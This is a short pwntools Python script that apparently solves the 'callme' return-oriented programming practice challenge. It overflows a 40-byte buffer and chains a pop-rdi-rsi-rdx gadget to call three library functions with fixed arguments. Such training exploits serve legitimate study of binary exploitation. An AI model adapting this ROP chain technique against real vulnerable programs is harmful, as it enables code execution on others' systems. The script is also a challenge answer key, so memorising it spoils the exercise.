from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"


binary_name = "callme"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)


context.binary = e


def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    elif(sys.argv[1] == "gdb"):
        p = gdb.debug(f"./{binary_name}", gdbscript="b *0x4008F1", aslr=False)
    else:
        p = process(f"./{binary_name}")

    # Functions
    ret = p64(0x4008f1)
    callme_one = e.plt['callme_one']
    callme_two = e.plt['callme_two']
    callme_three = e.plt['callme_three']
    pop_rdi_rsi_rdx=p64(0x40093c)

    # Parameter payloads

    callme_params= p64(0xDEADBEEFDEADBEEF) + p64(0xcafebabecafebabe) + p64(0xD00DF00DD00DF00D)
    prepare_params=pop_rdi_rsi_rdx+ callme_params

    payload = b"A" *40
    payload+= ret+ prepare_params + p64(callme_one) + prepare_params+ p64(callme_two) + prepare_params+p64(callme_three)

    p.sendline(payload)
    p.interactive()

main()
